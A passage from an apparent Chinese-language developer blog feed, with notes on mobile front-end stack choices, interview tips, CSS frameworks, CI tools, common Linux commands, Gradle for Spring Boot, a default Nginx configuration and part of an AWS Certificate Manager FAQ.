        <content type="html"><![CDATA[<h3 id="VUE-技术方案-如果需要嵌入微信等APP中，推荐该方案"><a href="#VUE-技术方案-如果需要嵌入微信等APP中，推荐该方案" class="headerlink" title="VUE 技术方案 (如果需要嵌入微信等APP中，推荐该方案)"></a>VUE 技术方案 (如果需要嵌入微信等APP中，推荐该方案)</h3><ul><li>vuejs2.0</li><li>vue-router</li><li>vuex</li><li>mint-ui</li><li>Jest</li></ul><p>常用lib信息</p><table><thead><tr><th>包名</th><th style="text-align:center">用途</th></tr></thead><tbody><tr><td>Vue</td><td style="text-align:center">VUE视图</td></tr><tr><td>Vue-router</td><td style="text-align:center">路由</td></tr><tr><td>Typescript</td><td style="text-align:center">静态类型</td></tr><tr><td>vuex</td><td style="text-align:center">状态管理</td></tr><tr><td>mint-ui</td><td style="text-align:center">ui框架</td></tr><tr><td>Jest</td><td style="text-align:center">测试框架</td></tr><tr><td>axios</td><td style="text-align:center">HTTP库</td></tr><tr><td>immutable</td><td style="text-align:center">immutable 工具</td></tr><tr><td>moment</td><td style="text-align:center">时间处理库</td></tr><tr><td>vue-class-component</td><td style="text-align:center">vue 的面向对象形式</td></tr><tr><td>vue-property-decorator</td><td style="text-align:center">vue 装饰器</td></tr><tr><td>vuex-class</td><td style="text-align:center">vuex的面向对象形式</td></tr><tr><td>vconsole</td><td style="text-align:center">手机网页调试工具</td></tr></tbody></table><p>参考资料:</p><ul><li>vue官方脚手架 (支持 TS、Babel、Vuex、SASS): <a href="https://www.npmjs.com/package/vue-cli" target="_blank" rel="noopener">https://www.npmjs.com/package/vue-cli</a></li><li><a href="https://segmentfault.com/a/1190000013676663" target="_blank" rel="noopener">https://segmentfault.com/a/1190000013676663</a> VUE + TS的项目搭建</li></ul><h3 id="HBuilder方案"><a href="#HBuilder方案" class="headerlink" title="HBuilder方案"></a>HBuilder方案</h3><ul><li>mui</li><li>Hbuilder</li></ul><p>成本低廉，开发方面，原生的webview API和切换性能也可<br>参考案例：<a href="https://github.com/linksgo2011/tinda_app_cordova/" target="_blank" rel="noopener">https://github.com/linksgo2011/tinda_app_cordova/</a></p><p>注意事项</p><ul><li>每个页面为一个独立的窗口</li><li>返回会有数据刷新问题</li><li>窗口内如果发生页面跳转，会造成路由不一致</li><li>尽量使用页面 + API的方式快速开发</li></ul><h3 id="React技术选型"><a href="#React技术选型" class="headerlink" title="React技术选型"></a>React技术选型</h3><ul><li>React</li><li>Redux </li><li>webpack</li></ul><p>参考案例</p><ul><li>cnode 客户端方案可以构建出web、mobile各种平台</li></ul><h3 id="Jquery技术方案"><a href="#Jquery技术方案" class="headerlink" title="Jquery技术方案"></a>Jquery技术方案</h3><ul><li>mui</li><li>zepto.js or jquery.js</li></ul><p>参考案例</p><ul><li>vue购物车 <a href="https://github.com/liu-zhuang/Vue-Demo" target="_blank" rel="noopener">https://github.com/liu-zhuang/Vue-Demo</a></li><li><a href="https://github.com/zoeminghong/shopping-cart-vue-project" target="_blank" rel="noopener">https://github.com/zoeminghong/shopping-cart-vue-project</a></li><li>音乐APP <a href="https://www.cnblogs.com/smartXiang/p/6055616.html" target="_blank" rel="noopener">https://www.cnblogs.com/smartXiang/p/6055616.html</a></li></ul><h2 id="打包方案"><a href="#打包方案" class="headerlink" title="打包方案"></a>打包方案</h2><p>使用cordova <a href="http://wiki.printf.cn/h5/h5/Build">http://wiki.printf.cn/h5/h5/Build</a> package with Apache Cordova</p>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>前端面试tips</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/Interview%20for%20frontend/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/Interview%20for%20frontend/</url>
      
        <content type="html"><![CDATA[<h2 id="面试考察目标"><a href="#面试考察目标" class="headerlink" title="面试考察目标"></a>面试考察目标</h2><ul><li>对于编程语言的掌握程度，比如基本语法，语言特性等等</li><li>实际动手写代码的速度，比如敲代码过程中是否流畅</li><li>Code Smell的识别与重构能力</li><li>对于软件设计的理解深度</li><li>对遇到问题的解决思路以及反应速度</li><li>对新需求的反应和理解速度</li><li>对新事物的态度和学习能力，比如新IDE，TDD等</li><li>沟通交流、协作能力</li><li>对待Feedback的态度</li></ul><h2 id="面试准备"><a href="#面试准备" class="headerlink" title="面试准备"></a>面试准备</h2><ol><li>作业查看</li><li>收集上一轮面试反馈</li><li>关键信息收集<ul><li>姓名</li><li>技术栈</li><li>工作年限</li><li>项目经历</li><li>毕业院校</li></ul></li></ol><h2 id="准备问题的几个维度"><a href="#准备问题的几个维度" class="headerlink" title="准备问题的几个维度"></a>准备问题的几个维度</h2><ol><li>理论基础</li><li>常用编程技巧是否熟练</li><li>接受Feedback和沟通是否顺畅</li><li>学习能力</li><li>发现问题能力</li><li>工程设计能力</li><li>细节和质量控制能力</li></ol><h2 id="几个可选的问题"><a href="#几个可选的问题" class="headerlink" title="几个可选的问题"></a>几个可选的问题</h2><ol><li>工作中是否使用了ES6那些语法特性?</li><li>了解哪些前端框架和库，他们的特点是什么？</li><li>你觉得这里用xxx是不是好一些？</li><li>如果你拿到一个新的框架，会怎么去快速上手？</li><li>对于你的代码，你觉得哪些点还可以提升？</li><li>这些逻辑是不是可以抽象出来？</li><li>怎么写单元测试？</li></ol>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CSS样式框架选型</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/frontend%20boilderplate/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/frontend%20boilderplate/</url>
      
        <content type="html"><![CDATA[<p>浏览器样式重置基本样式<br><a href="http://necolas.github.io/normalize.css/" target="_blank" rel="noopener">http://necolas.github.io/normalize.css/</a></p><p>simple, responsive boilerplate.<br><a href="http://getskeleton.com/" target="_blank" rel="noopener">http://getskeleton.com/</a></p><p>推荐使用，简单纯净易于修改，适用于定制性更强的项目</p><p>frozenui 腾讯出品</p><p><a href="http://frozenui.github.io/" target="_blank" rel="noopener">http://frozenui.github.io/</a></p><p>妹子UI，中国版的bootstrap<br><a href="http://amazeui.org/" target="_blank" rel="noopener">http://amazeui.org/</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>免费的CI/CD 工具</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/CI-free-tools/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/CI-free-tools/</url>
      
        <content type="html"><![CDATA[<h3 id="为什么要使用CI"><a href="#为什么要使用CI" class="headerlink" title="为什么要使用CI?"></a>为什么要使用CI?</h3><p>方便集成发布和包管理,举个例子就是在Merge PR之前运行测试,如果测试没有通过,不允许合并代码。</p><h3 id="能和Github集成的CI工具"><a href="#能和Github集成的CI工具" class="headerlink" title="能和Github集成的CI工具"></a>能和Github集成的CI工具</h3><p><a href="https://github.com/marketplace/category/continuous-integration" target="_blank" rel="noopener">https://github.com/marketplace/category/continuous-integration</a></p><p>Travis CI<br>CircleCI 推荐使用</p><h3 id="Github-flow"><a href="#Github-flow" class="headerlink" title="Github flow"></a>Github flow</h3><p>关键点</p><ul><li>代码质量</li><li>代码安全扫描</li><li>报警</li><li>包管理</li><li>自动部署和发布</li><li>代码审查</li></ul><p><a href="https://help.github.com/articles/github-flow/" target="_blank" rel="noopener">https://help.github.com/articles/github-flow/</a></p><p>使用github开发步骤</p><ul><li>Create a branch from the repository.</li><li>Create, edit, rename, move, or delete files.</li><li>Send a pull request from your branch with your proposed changes to kick off a discussion.</li><li>Make changes on your branch as needed. Your pull request will update automatically.</li><li>Merge the pull request once the branch is ready to be merged.</li><li>Tidy up your branches using the delete button in the pull request or on the branches page.</li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>最实用的Linux命令</title>
      <link href="/linux/linux/common-useful-commands/"/>
      <url>/linux/linux/common-useful-commands/</url>
      
        <content type="html"><![CDATA[<p>查看操作系统信息</p><blockquote><p>head -n 1 /etc/issue</p></blockquote><p>install JDK8 in ubuntu 14.04</p><p>Add the webupd8 ppa, and install from that -</p><blockquote><p>sudo add-apt-repository ppa:webupd8team/java</p></blockquote><blockquote><p>sudo apt-get update</p></blockquote><blockquote><p>sudo apt-get install oracle-java8-installer</p></blockquote><p>Then</p><blockquote><p>java -version</p></blockquote><p>should show you using Oracle Java 8. If not, or if you want to use a different version - run update-java-alternatives with something like,</p><blockquote><p>sudo update-java-alternatives -s java-8-oracle</p></blockquote><p>or</p><blockquote><p>sudo update-java-alternatives -s java-7-oracle</p></blockquote><p>As appropriate.</p><p>Got the error: apt-get-repository Command is Missing</p><p>fixed by</p><blockquote><p>sudo apt-get update</p></blockquote><blockquote><p>sudo apt-get install software-properties-common</p></blockquote><p><a href="https://stackoverflow.com/questions/25549492/install-jdk8-in-ubuntu-14-04" target="_blank" rel="noopener">https://stackoverflow.com/questions/25549492/install-jdk8-in-ubuntu-14-04</a></p><p>打包备份</p><blockquote><p>tar -zcvf “jiaonuobg_assets_$(date “+%Y%m%d”).tar.gz” jiaonuobg/assets</p></blockquote><p>备份nodejs+mysql项目</p><p>TBC</p><p>Maven wrapper 生成</p><blockquote><p>mvn -N io.takari:maven:wrapper</p></blockquote><p>根据端口查询Linux PID</p><blockquote><p>netstat -apn | grap $port</p></blockquote><p>从字符串中提取数字，例如PID</p><blockquote><p>output=$( netstat -apn | grep 8086 | grep LISTEN) &amp;&amp; read num1 num2 num3 num4 num5  &lt;&lt;&lt;${output//[^0-9]/ }<br>echo $num5</p></blockquote><p>让进程在后台执行</p><blockquote><p>java -jar package.jar &amp;</p></blockquote><p>执行一段Linux命令并给变量赋值</p><blockquote><p>output=$(netstat -apn | grep 8086 | sed ‘s/[0-9]*//g’)<br>echo $output</p></blockquote><p>查看服务器内存用量</p><blockquote><p>sudo free</p></blockquote><p>查看服务器磁盘用量</p><blockquote><p>sudo df -h</p></blockquote><p>Git 增加文件执行权限</p><blockquote><p>git update-index –chmod=+x $script</p></blockquote><p>查看sudo 环境下有哪些可用的权限</p><blockquote><p>sudo -l</p></blockquote><p>搜索文件相关</p><p>当前文件目录下搜索</p><blockquote><p>grep -RI ‘keyword’  .  </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Gradle 构建 Spring boot 项目</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/gradle-build-spring-boot/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/gradle-build-spring-boot/</url>
      
        <content type="html"><![CDATA[<h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>Gradle JVM 的富有突破性构建工具，可以通过编程式的编写构建脚本，非 xml 的方式构建项目，适用于相对复杂 Java 项目构建。</p><p>特性：</p><ul><li>对已有的 maven 和 ivy 仓库的全面支持</li><li>支持传递性依赖管理，而不需要远程仓库或者 pom.xml 或者 ivy 配置文件</li><li>ant 式的任务和构建是 gradle 的第一公民</li><li>基于 groovy，其 build 脚本使用 groovy dsl 编写</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Gradle 需要依赖 Java，在 Mac 下可以使用 Homebrew 安装</p><blockquote><p>brew install gradle </p></blockquote><p>查看安装情况</p><blockquote><p>gradle -v </p></blockquote><p>Linux 下载解压后，添加 bin 目录到 path 路径下即可。</p><h2 id="常见概念"><a href="#常见概念" class="headerlink" title="常见概念"></a>常见概念</h2><h3 id="project"><a href="#project" class="headerlink" title="project"></a>project</h3><p>一个 project 或者 多个 project 是 gradle 的一个构建单位。每个 project 或许是一个 jar 包或者一个 web 应用，它也可以是一个由许多其他项目中产生的 jar 构成的 zip 压缩包。</p><p>一般默认 Java 项目以一个 project 构建，有时候也会有多模块（实际上就是多project）构建。project 可以存在父子关系。</p><h3 id="task"><a href="#task" class="headerlink" title="task"></a>task</h3><p>一个具体的构建任务，例如打包、测试、发布到仓库等。大部分情况下我们都是用插件提供的 task，不需要自己编写 task。</p><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p>我们看到的 java 项目中必定有一个插件</p><blockquote><p>apply plugin: ‘java’</p></blockquote><p>Gradle 不一定只是为 Java 使用的，因此大部分情况下我们通过 java 插件提供构建能力。基本上 java 构建的过程比较类似。</p><ul><li>编译</li><li>测试</li><li>打包</li><li>发布</li></ul><p>插件是 Gradle 比较重要而概念，很多有用的 task 都是它提供的。常见的插件有：</p><ul><li>java</li><li>idea</li><li>io.spring.dependency-management</li><li>spring-boot</li></ul><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><p>就是 java 项目需要用到的其他 jar 包。原始的 java 开发我们都是从网上手动下载，然后倒入项目，使用 gradle 可以自动帮我们导入。</p><h3 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h3><p>Gradle 是在一个被称之为仓库的地方找寻所需的外部依赖。仓库即是一个按 group，name 和 version 规则进行存储的一些文件。Gradle 可以支持不同的仓库存储格式，如 Maven 和 Ivy，并且还提供多种与仓库进行通信的方式，如通过本地文件系统或 HTTP。</p><p>默认情况下，Gradle 没有定义任何仓库，你需要在使用外部依赖之前至少定义一个仓库，例如 Maven 中央仓库。</p><h2 id="java-插件基本使用"><a href="#java-插件基本使用" class="headerlink" title="java 插件基本使用"></a>java 插件基本使用</h2><p>引入 java 插件我们可以 通过 gradle tasks 查看该插件提供的 tasks。我们创建一个 build.gralde 然后引入  java 插件，再看看有什么任务。</p><blockquote><p>vim build.gradle </p></blockquote><pre><code>// 这个 build.gradle 只有一行代码apply plugin: &#39;java&#39;</code></pre><blockquote><p>gradle tasks</p></blockquote><pre><code>Build tasks-----------assemble - Assembles the outputs of this project.build - Assembles and tests this project.buildDependents - Assembles and tests this project and all projects that depend on it.buildNeeded - Assembles and tests this project and all projects it depends on.classes - Assembles main classes.clean - Deletes the build directory.jar - Assembles a jar archive containing the main classes.testClasses - Assembles test classes.Build Setup tasks-----------------init - Initializes a new Gradle build.wrapper - Generates Gradle wrapper files.Documentation tasks-------------------javadoc - Generates Javadoc API documentation for the main source code.Help tasks----------buildEnvironment - Displays all buildscript dependencies declared in root project &#39;gradle-practise&#39;.components - Displays the components produced by root project &#39;gradle-practise&#39;. [incubating]dependencies - Displays all dependencies declared in root project &#39;gradle-practise&#39;.dependencyInsight - Displays the insight into a specific dependency in root project &#39;gradle-practise&#39;.dependentComponents - Displays the dependent components of components in root project &#39;gradle-practise&#39;. [incubating]help - Displays a help message.model - Displays the configuration model of root project &#39;gradle-practise&#39;. [incubating]projects - Displays the sub-projects of root project &#39;gradle-practise&#39;.properties - Displays the properties of root project &#39;gradle-practise&#39;.tasks - Displays the tasks runnable from root project &#39;gradle-practise&#39;.Verification tasks------------------check - Runs all checks.test - Runs the unit tests.</code></pre><p>使用 java 插件，我们需要按照规范设置目录，然后 gradle 会帮我们自动构建,这个目录不需要我们自己创建，按照 IDE 生成即可。</p><pre><code>project      +build      +src/main/java      +src/main/resources      +src/test/java      +src/test/resources  </code></pre><p>Gradle 默认会从 src/main/java 搜寻打包源码，在 src/test/java 下搜寻测试源码。并且 src/main/resources 下的所有文件按都会被打包，所有 src/test/resources 下的文件 都会被添加到类路径用以执行测试。所有文件都输出到 build 下，打包的文件输出到 build/libs 下</p><p>比较有用的几个命令</p><p>编译、打包、测试</p><blockquote><p>build</p></blockquote><p>编译，以及运行单元测试</p><blockquote><p>test </p></blockquote><p>清理项目</p><blockquote><p>clean </p></blockquote><h2 id="简单配置-java-项目"><a href="#简单配置-java-项目" class="headerlink" title="简单配置 java 项目"></a>简单配置 java 项目</h2><p>配置依赖仓库，也就是依赖寻找的位置，可以使用本地仓库（自动缓存）、mavenCentral、Jcenter、阿里云或者自己搭建的镜像。</p><pre><code>    repositories {        mavenLocal()        maven { url &#39;http://maven.aliyun.com/nexus/content/groups/public/&#39; }        maven { url &#39;http://maven.aliyun.com/nexus/content/repositories/jcenter&#39; }        mavenCentral()    }</code></pre><p>配置依赖</p><pre><code>dependencies {    testCompile group: &#39;junit&#39;, name: &#39;junit&#39;, version: &#39;4.+&#39;}</code></pre><p>gralde 总依赖除了有很多种类型，目前Gradle版本支持的依赖配置有：implementation、api、compileOnly、runtimeOnly 和 annotationProcessor，已经废弃的配置有：compile、provided、apk、providedCompile。</p><ul><li>implementation 会添加依赖到编译路径，并且会将依赖打包到输出（aar或apk），但是在编译时不会将依赖的实现暴露给其他module，也就是只有在运行时其他module才能访问这个依赖中的实现。</li><li>api 与compile对应，功能完全一样，会添加依赖到编译路径，并且会将依赖打包到输出（aar或apk），与implementation不同，这个依赖可以传递，其他module无论在编译时和运行时都可以访问这个依赖的实现，也就是会泄漏一些不应该不使用的实现。举个例子，A依赖B，B依赖C，如果都是使用api配置的话，A可以直接使用C中的类（编译时和运行时），而如果是使用implementation配置的话，在编译时，A是无法访问C中的类的。</li><li>compileOnly 与provided对应，Gradle把依赖加到编译路径，编译时使用，不会打包到输出（aar或apk）。这可以减少输出的体积，在只在编译时需要，在运行时可选的情况，很有用。</li><li>runtimeOnly 与apk对应，gradle添加依赖只打包到APK，运行时使用，但不会添加到编译路径。这个没有使用过。</li><li>annotationProcessor。编译前处理注解，例如 lombok。</li></ul><p>一个最简单的 java 项目可以由这两部分构成即可完成。</p><h2 id="spring-boot-插件"><a href="#spring-boot-插件" class="headerlink" title="spring boot 插件"></a>spring boot 插件</h2><p>在使用 Spring Boot 时，bootrun 这个task就是 Spring boot 插件提供的。</p><p>使用这个插件需要先配置 buildScript 告诉 gradle 插件从哪里找，因为 spring boot 并不是 gradle 的核心插件。</p><pre><code>buildscript {    ext {        springBootVersion = &#39;2.1.4.RELEASE&#39;    }    repositories {        gradlePluginPortal()    }    dependencies {    classpath(&quot;org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}&quot; as Object)    }}</code></pre><p>然后添加</p><pre><code>apply plugin: &#39;org.springframework.boot&#39;</code></pre><p>再查看 gradle tasks，就会多了一些 bootRun 等任务。</p><pre><code>Application tasks-----------------bootRun - Runs this project as a Spring Boot application.Build tasks-----------assemble - Assembles the outputs of this project.bootBuildInfo - Generates a META-INF/build-info.properties file.bootJar - Assembles an executable jar archive containing the main classes and their dependencies.build - Assembles and tests this project.buildDependents - Assembles and tests this project and all projects that depend on it.buildNeeded - Assembles and tests this project and all projects it depends on.classes - Assembles main classes.clean - Deletes the build directory.generateGitPropertiesjar - Assembles a jar archive containing the main classes.testClasses - Assembles test classes.</code></pre><h2 id="dependency-management-插件"><a href="#dependency-management-插件" class="headerlink" title="dependency-management 插件"></a>dependency-management 插件</h2><p>上面讲插件的依赖引入后，Spring boot 还提供了另外一个非常高级的插件。</p><p>引入</p><pre><code>apply plugin: &#39;io.spring.dependency-management&#39;</code></pre><p>Spring 版本火车中的子项目都可以不在需要指定版本号，版本号由 Spring boot 指定，从而解决 Spring 家族版本不一致的问题。</p><h2 id="wrapper"><a href="#wrapper" class="headerlink" title="wrapper"></a>wrapper</h2><p>wapper 是为了解决开发者拿到一个新项目没有本地安装的 gradle，或者版本不一致，导致非常不方便的问题。</p><p>配置项目时，需要用到 gradle 然后生成 gradle wrapper 文件（bat 或者 shell脚本）</p><ul><li>gradlew</li><li>gradlew.bat</li></ul><p>以及一些配置文件 .gradle</p><p>下一个开发者，运行项目时只需要有 java 不需要 gradle 即可使用 ./gradlew 运行即可。</p><p>首次生成 wrapper 的命令</p><blockquote><p>gradle wrapper </p></blockquote><h2 id="对-java-开发者需要注意的几个插件"><a href="#对-java-开发者需要注意的几个插件" class="headerlink" title="对 java 开发者需要注意的几个插件"></a>对 java 开发者需要注意的几个插件</h2><ul><li>java 插件</li><li>spring-boot 插件</li><li>dependency-management 插件</li></ul><h2 id="一份相对完整-spring-boot-配置清单"><a href="#一份相对完整-spring-boot-配置清单" class="headerlink" title="一份相对完整 spring boot 配置清单"></a>一份相对完整 spring boot 配置清单</h2><pre><code>// Gradle 构建本身需要的配置（例如插件仓库）buildscript {    // 配置变量    ext {        flywayVersion = &#39;3.2.1&#39;        hibernateVersion = &#39;5.3.7.Final&#39;    }    // 插件仓库    repositories {        gradlePluginPortal()    }    // 应用插件需要的依赖包    dependencies {        classpath(&quot;org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}&quot; as Object)    }}// idea 插件，用来生成 idea 工程目录apply plugin: &#39;idea&#39;// java 插件,提供 build、jar 等taskapply plugin: &#39;java&#39;// spring boot 插件提供 bootrun 等task，非必须apply plugin: &#39;org.springframework.boot&#39;// dependency-management 插件，为spring 版本火车项目提供一致的版本号apply plugin: &#39;io.spring.dependency-management&#39;// 指定构建输出目录buildDir = &#39;./out&#39;// 指定包信息group = &#39;cn.printf&#39;version = &#39;1.0.0&#39;// java 版本sourceCompatibility = 1.8targetCompatibility = 1.8// 编译字符集tasks.withType(JavaCompile) { options.encoding = &#39;utf-8&#39; }// 包依赖仓库repositories {    mavenLocal()    maven { url &#39;http://maven.aliyun.com/nexus/content/groups/public/&#39; }    maven { url &#39;http://maven.aliyun.com/nexus/content/repositories/jcenter&#39; }    mavenCentral()}// 依赖dependencies {    // 监控    compile &#39;org.springframework.boot:spring-boot-starter-actuator&#39;    compileOnly &quot;org.projectlombok:lombok&quot;    testCompileOnly &quot;org.projectlombok:lombok&quot;    // web     compile &#39;org.springframework.boot:spring-boot-starter-web&#39;    // Session    compile &#39;org.springframework.boot:spring-boot-starter-data-redis&#39;    compile &#39;org.springframework.session:spring-session-data-redis&#39;    // database    compile &#39;org.springframework.boot:spring-boot-starter-data-jpa&#39;    runtimeOnly &#39;mysql:mysql-connector-java&#39;    // 数据库迁移    compile &#39;org.flywaydb:flyway-core&#39;    // 对象转换    compile group: &#39;org.modelmapper&#39;, name: &#39;modelmapper&#39;, version: &#39;1.1.1&#39;    // 加密库    compile &#39;commons-codec:commons-codec:1.13&#39;    // 测试    testCompile(&quot;org.springframework.boot:spring-boot-starter-test&quot;)    // 开发热启动工具    runtime(&#39;org.springframework.boot:spring-boot-devtools&#39;)}</code></pre><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li>教程 <a href="https://www.w3cschool.cn/gradle/6qo51htq.html" target="_blank" rel="noopener">https://www.w3cschool.cn/gradle/6qo51htq.html</a></li><li><a href="https://docs.gradle.org/current/userguide/command_line_interface.html" target="_blank" rel="noopener">https://docs.gradle.org/current/userguide/command_line_interface.html</a></li><li><a href="https://www.jianshu.com/p/59fd653a54d2" target="_blank" rel="noopener">https://www.jianshu.com/p/59fd653a54d2</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>系统监控和维护</title>
      <link href="/linux/linux/monitors-for%20website/"/>
      <url>/linux/linux/monitors-for%20website/</url>
      
        <content type="html"><![CDATA[<h2 id="日志分析技巧"><a href="#日志分析技巧" class="headerlink" title="日志分析技巧"></a>日志分析技巧</h2><pre><code>- 查看日志文件命令    - cat 快速显示文件    - more less 分页查找    - tail 显示文件尾    - head 显示文件头    - sort 内容排序    - wc 字符统计 wc 为Word count的缩写    - uniq 去重连续的重复行 </code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Nginx 常用操作</title>
      <link href="/Nginx/nginx/nginx-usful-command/"/>
      <url>/Nginx/nginx/nginx-usful-command/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是-Nginx"><a href="#什么是-Nginx" class="headerlink" title="什么是 Nginx"></a>什么是 Nginx</h1><p>Nginx是一个优秀的web服务器，同时也可以用作负载均衡和反向代理 </p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>在Ubuntu的环境下，安装Nginx</p><blockquote><p>apt-get install nginx</p></blockquote><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>配置修改后不停服重载</p><blockquote><p>service nginx reload</p></blockquote><p>停服重启</p><blockquote><p>service nginx start</p></blockquote><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>Nginx的配置文件位于</p><p><code>/etc/nginx</code></p><p>配置文件入口为 nginx.conf，其中定义了全局的配置文件，包括日志位置、gzip、邮件以及加载站点的等配置。</p><p>我们常用的站点信息配置在：</p><p>/etc/nginx/sites-enabled/*;</p><h3 id="一个默认的配置文件"><a href="#一个默认的配置文件" class="headerlink" title="一个默认的配置文件"></a>一个默认的配置文件</h3><p><code></code><br>server {<br>    listen 80 default_server;<br>    listen [::]:80 default_server ipv6only=on;</p><pre><code># 资源根目录root /var/www;# 主页index index.html index.htm index.php ;# Make site accessible from http://localhost/server_name localhost;location / {    # First attempt to serve request as file, then    # as directory, then fall back to displaying a 404.    try_files $uri $uri/ =404;    # Uncomment to enable naxsi on this location    # include /etc/nginx/naxsi.rules}# 配置反向代理 例如 host/sub-path -&gt; http://127.0.0.1:8080; # Only for nginx-naxsi used with nginx-naxsi-ui : process denied requests#location /RequestDenied {#    proxy_pass http://127.0.0.1:8080;    #}#error_page 404 /404.html;# redirect server error pages to the static page /50x.html##error_page 500 502 503 504 /50x.html;#location = /50x.html {#    root /usr/share/nginx/html;#}# 开启PHP 解析# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000#location ~ \.php$ {    fastcgi_split_path_info ^(.+\.php)(/.+)$;    # NOTE: You should have &quot;cgi.fix_pathinfo = 0;&quot; in php.ini    # With php5-cgi alone:    fastcgi_pass 127.0.0.1:9000;    # With php5-fpm:    fastcgi_pass unix:/var/run/php5-fpm.sock;    fastcgi_index index.php;    include fastcgi_params;}# deny access to .htaccess files, if Apache&#39;s document root# concurs with nginx&#39;s one##location ~ /\.ht {#    deny all;#}</code></pre><p>}</p><p><code></code></p><h3 id="Nginx-解析PHP的原理"><a href="#Nginx-解析PHP的原理" class="headerlink" title="Nginx 解析PHP的原理"></a>Nginx 解析PHP的原理</h3><p>Nginx发送请求到php-fpm进程，然后php-fpm解析后返回给Nginx，即HTTP协议处理为Nginx完成，php-fpm 作为后台服务解析PHP页面</p><h3 id="Nginx-增加虚拟主机方法"><a href="#Nginx-增加虚拟主机方法" class="headerlink" title="Nginx 增加虚拟主机方法"></a>Nginx 增加虚拟主机方法</h3><blockquote><p>mv default v-host</p></blockquote><blockquote><p>vim v-host</p></blockquote><p>然后修改 v-host 文件中server_name为站点域名，讲该域名DNS指向本机即可</p><p>然后重在或者重启Nginx服务器 </p><blockquote><p>service nginx restart</p></blockquote><p>查看服务器状态</p><blockquote><p>service nginx status</p></blockquote><p>如果服务器重启有误或者无效，可以在nginx.info 中找到日志文件查看并修改。</p>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>AWS Certificate Manager 常见问题</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/aws-certificate-manager-faqs/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/aws-certificate-manager-faqs/</url>
      
        <content type="html"><![CDATA[<h3 id="一般性问题"><a href="#一般性问题" class="headerlink" title="一般性问题"></a>一般性问题</h3><p>问：什么是 AWS Certificate Manager (ACM)？</p><p>AWS Certificate Manager 是一项服务，可帮助您轻松地预置、管理和部署用于 AWS 服务的安全套接字层/传输层安全性 (SSL/TLS) 证书。SSL/TLS 证书用于保护网络通信的安全并确立网站在 Internet 上的身份。使用 AWS Certificate Manager，您无需再为购买、上传和更新 SSL/TLS 证书而经历耗时的手动流程。利用 AWS Certificate Manager，您可以快速请求证书，在 AWS 资源 (如 Amazon API Gateway 上的 Elastic Load Balancer、Amazon CloudFront 分配或 API) 上部署该证书，并让 AWS Certificate Manager 处理证书更新事宜。通过 AWS Certificate Manager 预置的 SSL/TLS 证书可免费使用。您只需为您创建的用于运行应用程序的 AWS 资源付费。</p><p>问：什么是 SSL/TLS 证书？</p><p>SSL/TLS 证书使 Web 浏览器能够标识使用安全套接字层/传输层安全性 (SSL/TLS) 协议的网站并与之建立加密的网络连接。证书在名为公有密钥基础设施 (PKI) 的加密系统中使用。通过 PKI，在双方都信任同一个第三方 (称为证书颁发机构) 的情况下，一方可以为使用证书的另一方确立身份。ACM 用户指南、概念和术语提供了其他背景信息和定义。</p><p>问：AWS Certificate Manager 有什么作用？</p><p>您可以请求并预置 SSL/TLS 证书，然后为使用 Elastic Load Balancing、Amazon CloudFront 或 Amazon API Gateway 的站点和应用程序部署这些证书。验证请求域的所有权并获得颁发的证书之后，您可以从 AWS 管理控制台的下拉列表中选择 SSL/TLS 证书并部署该证书。或者，您也可以使用 AWS 命令行界面 (CLI) 命令或 API 调用将 ACM 提供的证书部署到 AWS 资源。ACM 会为您管理证书更新和证书部署事宜。</p><p>问：使用 AWS Certificate Manager 有哪些优势？</p><p>借助 ACM，您可以更加轻松地为 AWS 平台上的网站或应用程序启用 SSL/TLS。ACM 免除了过去与使用 SSL/TLS 和管理 SSL/TLS 证书相关的大量手动流程。ACM 还可管理证书更新，从而帮助您避免因证书配置错误、撤销或过期而导致的停机。您可获得 SSL/TLS 保护并轻松管理证书。启用 SSL/TLS 有助于提高站点的搜索排名，并可帮助您满足传输数据加密的法规合规性要求。</p><p>当您使用 ACM 